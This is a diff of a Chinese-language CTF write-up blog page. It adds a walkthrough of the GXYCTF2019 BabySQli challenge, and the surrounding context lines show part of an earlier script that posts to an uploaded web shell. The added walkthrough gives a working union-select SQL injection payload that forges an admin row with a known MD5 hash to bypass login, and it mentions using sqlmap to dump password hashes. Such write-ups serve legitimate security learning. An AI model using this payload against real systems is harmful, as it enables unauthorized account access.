@@ -172,12 +172,12 @@
             
             <span class="tag">
                 
-                <a href="/tags/ctf/" style="color: #00a596">ctf</a>
+                <a href="/tags/ctf/" style="color: #03a9f4">ctf</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/web/" style="color: #00bcd4">web</a>
+                <a href="/tags/web/" style="color: #ff7d73">web</a>
             </span>
             
         </span>
@@ -665,6 +665,22 @@ res_shell = session.post(url + res_jpg.text[-69:-22], data=&#123;&#39;a&#39;: &#
 
 print(res_shell.text)
 </code></pre>
+<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]BabySQli">[GXYCTF2019]BabySQli</a></h3><p>尝试任意登录发现是post传参，于是抓包，在返回包中发现提示：<code>&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code> 看到是base32，解码后得到</p>
+<pre><code class="sql">select * from user where username = &#39;$name&#39;
+</code></pre>
+<p>想用联合查询尝试注入，发现有过滤，用bp跑一下注入字典，发现过滤了好多关键字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307222329698.png" alt="image-20230722232942534"></p>
+<p>通过sqlmap可以得到数据库中账户密码的md5</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307230041248.png" alt="image-20230723004126295"></p>
+<p>之后去查md5并没有得到结果，看wp之后知道联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据。 </p>
+<p>例如用</p>
+<pre><code class="sql">select * from users union select 1,&#39;admin&#39;,md5(123)；
+</code></pre>
+<p>就会在原有数据下加上后面这一条，所以我们可以构造</p>
+<pre><code class="sql">name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123
+</code></pre>
+<p>这样就能得到结果。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307232356601.png" alt="image-20230723235620443"></p>
 
     </div>
     
